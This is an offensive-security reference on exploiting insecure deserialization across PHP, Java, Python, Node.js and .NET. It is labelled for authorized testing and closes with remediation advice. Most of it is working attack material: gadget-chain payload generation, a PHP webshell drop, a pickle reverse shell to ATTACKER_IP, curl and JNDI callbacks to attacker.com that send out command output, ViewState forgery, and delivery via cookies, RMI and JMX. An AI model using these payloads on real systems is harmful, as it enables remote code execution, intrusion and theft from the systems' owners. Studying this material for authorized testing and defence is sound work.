# Insecure Deserialization — Multi-Language Specialist Skill

**Scope:** Authorized penetration tests, CTF challenges, and security research only.  
**Version:** 2026-current | Verified against OWASP, PortSwigger, NVD, and tool repos.

---

## 1. Background

Deserialization vulnerabilities occur when an application deserializes attacker-controlled data without validation, allowing object injection attacks. The deserialized object can trigger "magic methods" (PHP), readObject() (Java), __reduce__ (Python), or similar lifecycle hooks that execute attacker-controlled code.

**OWASP Top 10 2021:** A08:2021 — Software and Data Integrity Failures (includes deserialization).

**Impact:** Remote Code Execution, authentication bypass, privilege escalation, SSRF.

---

## 2. PHP Deserialization

### 2.1 Vulnerability Conditions
- `unserialize()` called on user-controlled input
- Target class loaded in scope has exploitable magic methods: `__wakeup()`, `__destruct()`, `__toString()`, `__call()`, `__get()`
- A "POP chain" (Property-Oriented Programming) exists linking available classes

### 2.2 PHP Magic Methods Abused in Chains
| Magic Method | Triggered When |
|---|---|
| `__wakeup()` | Object is unserialized |
| `__destruct()` | Object goes out of scope (end of request) |
| `__toString()` | Object used as string |
| `__call()` | Undefined method called |
| `__get()` | Undefined property read |
| `__invoke()` | Object called as function |

### 2.3 Manual PHP Object Injection
```php
// Vulnerable code pattern:
$data = unserialize($_GET['data']);  // VULNERABLE

// Basic object injection test:
// Craft a serialized PHP string to test if unserialize is called
// O:8:"stdClass":1:{s:4:"test";s:4:"test";}
// URL encoded: O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A4%3A%22test%22%3B%7D
```

```bash
# Black-box detection: send a serialized PHP string and observe errors
curl "https://target.com/page?data=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A4%3A%22test%22%3B%7D"
# PHP error referencing object class = unserialize confirmed

# Probe with invalid serialized data to trigger error messages
curl "https://target.com/page?data=O%3A999%3A%22FakeClass%22%3A0%3A%7B%7D"
# Error: Class "FakeClass" not found = confirmed unserialize
```

### 2.4 PHPGGC Tool Usage
```bash
git clone https://github.com/ambionics/phpggc
cd phpggc

# List all chains
./phpggc -l

# List chains for a specific framework
./phpggc -l | grep -i symfony
./phpggc -l | grep -i laravel
./phpggc -l | grep -i wordpress

# Generate a payload
./phpggc Monolog/RCE1 system id
# Raw serialized PHP output

# Base64 encode for URL delivery
./phpggc Monolog/RCE1 system id -b

# Generate with a custom command
./phpggc Symfony/RCE4 system "curl https://attacker.com/$(id)" -b

# Generate for file write (drop webshell)
./phpggc Laravel/RCE1 file_put_contents /var/www/html/shell.php "<?php system(\$_GET['c']); ?>" -b

# Phar archive generation (for phar:// deserialization via file operations)
./phpggc Monolog/RCE1 system id --phar phar -o /tmp/payload.phar
```

### 2.5 POP Chain Construction (Manual)
```php
// Example POP chain using two classes:
// Class A: __destruct() calls $this->helper->format($this->data)
// Class B: format() calls eval() on input

// Step 1: Identify candidate classes by searching for magic methods
grep -r "__destruct\|__wakeup\|__toString\|__call" /var/www/html/vendor/

// Step 2: Trace the call graph to find eval/system/exec calls
grep -r "eval\|system\|exec\|passthru\|shell_exec\|popen" /var/www/html/vendor/

// Step 3: Construct the chain
$b = new ClassB();
$a = new ClassA();
$a->helper = $b;
$a->data = "system('id');";
echo serialize($a);
```

---

## 3. Java Deserialization

### 3.1 Vulnerability Indicators (Black-Box)
```bash
# Look for base64-encoded serialized Java objects (start with rO0A)
echo "rO0ABXN..." | base64 -d | xxd | head
# Magic bytes: AC ED 00 05 (hex) = Java serialized object

# HTTP headers/cookies/parameters containing base64 blobs
# viewstate parameter (could be .NET or Java)
# serialized= parameters
# __flash objects
```

### 3.2 ysoserial Tool Usage
```bash
# Download latest release
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List available gadget chains
java -jar ysoserial-all.jar 2>&1 | head -50

# Generate payload with Commons Collections 3 (CC3) - most common
java -jar ysoserial-all.jar CommonsCollections3 'id' | base64 -w 0

# Common gadget chains and when to use them:
# CommonsCollections1-7: Apache Commons Collections (very widespread)
# Spring1/Spring2: Spring Framework
# Groovy1: Groovy library
# URLDNS: Safe chain for detection (DNS lookup only, no RCE)

# URLDNS for blind detection (no code exec, just DNS)
java -jar ysoserial-all.jar URLDNS 'http://attacker.burpcollaborator.net' | base64 -w 0

# CC3 RCE payload for curl-based OOB confirmation
java -jar ysoserial-all.jar CommonsCollections3 \
  'curl http://attacker.com/callback?data=$(id|base64)' | base64 -w 0

# Spring4Shell (CVE-2022-22965) - different from deserialization but related
# Affects Spring Framework 5.3.0-17, 5.2.0-19 with JDK 9+
```

### 3.3 Delivery Methods
```bash
# Via HTTP parameter
PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections3 'id' | base64 -w 0)
curl "https://target.com/api/endpoint?data=${PAYLOAD}"

# Via HTTP body (JSON API accepting base64)
curl -X POST "https://target.com/api/deserialize" \
  -H "Content-Type: application/json" \
  -d "{\"serialized\": \"${PAYLOAD}\"}"

# Via cookie
curl "https://target.com/page" \
  -H "Cookie: rememberMe=${PAYLOAD}"

# Via Java RMI (if exposed, port 1099)
# Use ysoserial RMIRegistryExploit:
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit \
  <target-ip> 1099 CommonsCollections3 'id'

# Via JMX (port 9999)
java -cp ysoserial-all.jar ysoserial.exploit.JMXInvokeMBean \
  <target-ip> 9999 CommonsCollections3 'id'
```

### 3.4 Log4Shell (CVE-2021-44228) Chain — Still in the Wild 2026
```bash
# Log4Shell exploits JNDI lookup injection, not classic deserialization
# But delivery of deserialization payloads via JNDI is a common chain

# JNDI string that triggers LDAP lookup:
JNDI_PAYLOAD='${jndi:ldap://attacker.com/exploit}'

# Test injection points (User-Agent, X-Forwarded-For, etc.)
curl "https://target.com/" \
  -H "User-Agent: ${JNDI_PAYLOAD}" \
  -H "X-Forwarded-For: ${JNDI_PAYLOAD}" \
  -H "X-Api-Version: ${JNDI_PAYLOAD}"

# Detection: monitor Burp Collaborator or interactsh for LDAP callbacks
# Fix: Log4j >= 2.17.0 (2.12.4 for Java 7, 2.3.2 for Java 6)
```

---

## 4. Python Deserialization

### 4.1 pickle RCE
Python's `pickle` module executes arbitrary code during deserialization via `__reduce__`.

```python
# Vulnerable code pattern:
import pickle
data = pickle.loads(user_input)  # DANGEROUS

# Crafting a malicious pickle payload:
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
# Send this base64 to the target
```

```bash
# Generating pickle payload for reverse shell
python3 -c "
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"',))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
"

# Delivery as HTTP parameter
curl "https://target.com/api/load?data=${PAYLOAD}"

# Or as POST body
curl -X POST "https://target.com/api/load" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### 4.2 PyYAML Deserialization (CVE-2020-1747 class)
```python
# Vulnerable: yaml.load() with default Loader or Loader=yaml.Loader
import yaml
yaml.load(user_input)  # DANGEROUS (older PyYAML)
yaml.load(user_input, Loader=yaml.Loader)  # DANGEROUS

# Safe:
yaml.safe_load(user_input)  # Uses SafeLoader, no object deserialization
```

```python
# Malicious YAML payload:
payload = """
!!python/object/apply:os.system ["id"]
"""
# Or for subprocess:
payload2 = """
!!python/object/apply:subprocess.check_output
  - [id]
"""

# Delivery
curl -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/yaml" \
  -d '!!python/object/apply:os.system ["id > /tmp/pwned"]'
```

### 4.3 jsonpickle Deserialization
```python
# jsonpickle uses {"py/object": "module.Class", ...} format
# Vulnerable:
import jsonpickle
jsonpickle.decode(user_input)  # Can instantiate arbitrary classes

# Payload:
import json
payload = json.dumps({
    "py/reduce": [
        {"py/type": "os.system"},
        {"py/tuple": ["id"]}
    ]
})
```

---

## 5. Node.js Deserialization

### 5.1 node-serialize (CVE-2017-5941)
```bash
# Vulnerable code: serialize library with unserialize() on user input
# node-serialize@0.0.4 allows IIFE (Immediately Invoked Function Expression)
```

```javascript
// Malicious payload for node-serialize:
var payload = {
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id', function(err, stdout, stderr){console.log(stdout)});}()"
};
JSON.stringify(payload);
// The _$$ND_FUNC$$_ prefix triggers eval() of the function
```

```bash
# Generate payload
python3 -c "
import json
payload = '{\"rce\":\"_\$\$ND_FUNC\$\$_function(){require(\\\"child_process\\\").exec(\\\"id\\\",function(e,s){process.stdout.write(s)})}()\"}'
print(payload)
"

# Deliver via cookie or POST body
curl "https://target.com/api" \
  -H "Cookie: profile=$(python3 -c 'import base64,json; print(base64.b64encode(PAYLOAD.encode()).decode())')"
```

### 5.2 cryo Deserialization
```javascript
// cryo library allows serialization of complex JS objects
// Vulnerable: cryo.parse(user_controlled_data)
// Payload construction similar to node-serialize
```

---

## 6. .NET Deserialization

### 6.1 BinaryFormatter (Deprecated but Still Deployed)
```bash
# BinaryFormatter serialized objects start with bytes: FF FF FF FF 01 00 00 00
# Typically base64 encoded in ViewState, cookies, or custom fields
```

```csharp
// Vulnerable code:
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // DANGEROUS

// Exploitable with gadget chains from ysoserial.net
```

### 6.2 ysoserial.net
```powershell
# Download: https://github.com/pwntester/ysoserial.net

# List available formatters and gadgets
./ysoserial.exe -h
./ysoserial.exe --fullhelp

# Generate BinaryFormatter payload
./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "cmd /c whoami > C:\windows\temp\pwned.txt"

# DataContractSerializer payload
./ysoserial.exe -f DataContractSerializer -g ObjectDataProvider -o base64 -c "calc.exe"

# ViewState MAC bypass (see 6.3)
./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "whoami" --path="/default.aspx" --apppath="/"

# JSON.NET TypeNameHandling attack
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe"
```

### 6.3 ViewState MAC Bypass (.NET WebForms)
```bash
# ViewState is base64-encoded serialized .NET objects
# Protected by HMAC using machineKey from web.config
# If machineKey is known (leaked via LFI/XXE) → forge malicious ViewState

# Step 1: Extract machineKey from web.config
# Via path traversal: GET /../../web.config
# Via XXE: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><foo>&xxe;</foo>

# Step 2: Generate ViewState with known machineKey
./ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell -enc BASE64_ENCODED_CMD" \
  --path="/page.aspx" --apppath="/" \
  --validationalg="SHA1" \
  --validationkey="EXTRACTED_MACHINE_KEY"

# Step 3: Deliver in __VIEWSTATE parameter
curl -X POST "https://target.com/page.aspx" \
  -d "__VIEWSTATE=GENERATED_PAYLOAD&__VIEWSTATEGENERATOR=...&__EVENTVALIDATION=..."
```

---

## 7. Black-Box Detection Methodology

### 7.1 Timing-Based Detection
```bash
# Java: URLDNS chain causes DNS lookup (detectable, no code exec)
PAYLOAD=$(java -jar ysoserial-all.jar URLDNS 'http://unique.attacker.burpcollaborator.net' | base64 -w 0)
curl "https://target.com/endpoint" -d "data=${PAYLOAD}"
# Monitor Burp Collaborator for DNS lookups

# PHP: serialize a non-existent class
curl "https://target.com/endpoint?data=O%3A15%3A%22FakeClassName99%22%3A0%3A%7B%7D"
# Error message reveals unserialize is called
```

### 7.2 Error Message Fingerprinting
```bash
# Java deserialization errors
# "java.io.StreamCorruptedException: invalid stream header"
# "java.lang.ClassNotFoundException"
# Reveals Java deserialization endpoint

# PHP:
# "unserialize(): Error at offset X"
# "Class 'ClassName' not found"

# Python pickle:
# "pickle data was truncated"
# "_pickle.UnpicklingError"
```

### 7.3 OOB (Out-of-Band) Confirmation
```bash
# Use interactsh for OOB callbacks
# https://github.com/projectdiscovery/interactsh

# Start listener
./interactsh-client

# Generate payload with OOB callback
java -jar ysoserial-all.jar CommonsCollections3 \
  "curl http://UNIQUE.oast.fun/$(hostname|base64)" | base64 -w 0

# Python:
python3 -c "
import pickle, os, base64
class OOB:
    def __reduce__(self):
        return (os.system, ('curl http://UNIQUE.oast.fun/\$(id|base64)',))
print(base64.b64encode(pickle.dumps(OOB())).decode())
"
```

---

## 8. Tools Reference

| Tool | Language | Repo |
|---|---|---|
| PHPGGC | PHP | https://github.com/ambionics/phpggc |
| ysoserial | Java | https://github.com/frohoff/ysoserial |
| ysoserial.net | .NET | https://github.com/pwntester/ysoserial.net |
| marshalsec | Java | https://github.com/mbechler/marshalsec |
| GadgetProbe | Java (detection) | https://github.com/BishopFox/GadgetProbe |
| DeserLab | Multi (educational) | https://github.com/NickstaDB/DeserLab |

---

## 9. Remediation

- **PHP:** Never pass user input to `unserialize()`. Use JSON for data exchange. If unavoidable, use `allowed_classes` parameter: `unserialize($data, ['allowed_classes' => false])`
- **Java:** Replace `ObjectInputStream` with Jackson/Gson with strict type controls. Apply SerialKiller or NotSoSerial serialization filter. Apply JEP 290 deserialization filters.
- **Python:** Never use `pickle` on untrusted data. Use `json` or `ast.literal_eval` for safe deserialization.
- **Node.js:** Do not use `node-serialize` or `cryo` on user input. Use JSON.parse() only.
- **.NET:** Replace `BinaryFormatter` with `System.Text.Json`. Use `DataContractSerializer` with known types only. Rotate `machineKey` and keep it secret.

---

## 10. Finding Schema
```
Title: Insecure Deserialization ([language/framework]) via [parameter]
CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
Evidence: OOB DNS callback / command output showing RCE
Tools: PHPGGC / ysoserial / ysoserial.net
Impact: Remote Code Execution as application user
References:
  - https://owasp.org/www-project-top-ten/2021/A08_2021-Software_and_Data_Integrity_Failures
  - https://github.com/frohoff/ysoserial
  - https://github.com/ambionics/phpggc
```

---

*All targets in this document are placeholder references. Apply only to in-scope authorized systems.*
